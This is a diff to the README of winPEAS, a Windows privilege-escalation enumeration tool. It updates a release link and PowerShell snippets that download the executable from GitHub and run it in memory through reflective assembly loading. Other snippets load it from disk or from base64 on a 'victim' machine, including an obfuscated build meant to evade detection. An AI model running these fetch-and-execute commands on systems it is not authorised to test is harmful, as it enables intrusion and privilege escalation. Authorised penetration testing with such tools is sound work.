@@ -13,22 +13,27 @@ Check also the **Local Windows Privilege Escalation checklist** from **[book.hac
 **.Net >= 4.5.2 is required**
 
 Precompiled binaries:
-- Download the **[latest obfuscated and not obfuscated versions from here](https://github.com/carlospolop/PEASS-ng/releases/tag/refs%2Fheads%2Fmaster)** or **compile it yourself** (read instructions for compilation).
+- Download the **[latest obfuscated and not obfuscated versions from here](https://github.com/carlospolop/PEASS-ng/releases/latest)** or **compile it yourself** (read instructions for compilation).
 
 ```bash
-#One liner to download and execute winPEASany from memory in a PS shell
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fheads%2Fmaster/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+# Get latest release
+$latestRelease = Invoke-WebRequest https://github.com/carlospolop/PEASS-ng/releases/latest -Headers @{"Accept"="application/json"}
+$json = $latestRelease.Content | ConvertFrom-Json
+$latestVersion = $json.tag_name
+$url = "https://github.com/carlospolop/PEASS-ng/releases/download/$latestVersion/winPEASany.exe"
 
-#Before cmd in 3 lines
-$url = "https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fheads%2Fmaster/winPEASany_ofs.exe"
+# One liner to download and execute winPEASany from memory in a PS shell
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+
+# Before cmd in 3 lines
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
 
-#Load from disk in memory and execute:
+# Load from disk in memory and execute:
 $wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
 
-#Load from disk in base64 and execute
+# Load from disk in base64 and execute
 ##Generate winpeas in Base64:
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("D:\Users\user\winPEAS.exe")) | Out-File -Encoding ASCII D:\Users\user\winPEAS.txt
 ##Now upload the B64 string to the victim inside a file or copy it to the clipboard
@@ -41,7 +46,7 @@ $thecontent = "aaaaaaaa..." #Where "aaa..." is the winpeas base64 string
 $wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
 
-#Loading from file and executing a winpeas obfuscated version
+# Loading from file and executing a winpeas obfuscated version
 ##Load obfuscated version
 $wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS-Obfuscated.exe")));
 $wp.EntryPoint #Get the name of the ReflectedType, in obfuscated versions sometimes this is different from "winPEAS.Program"
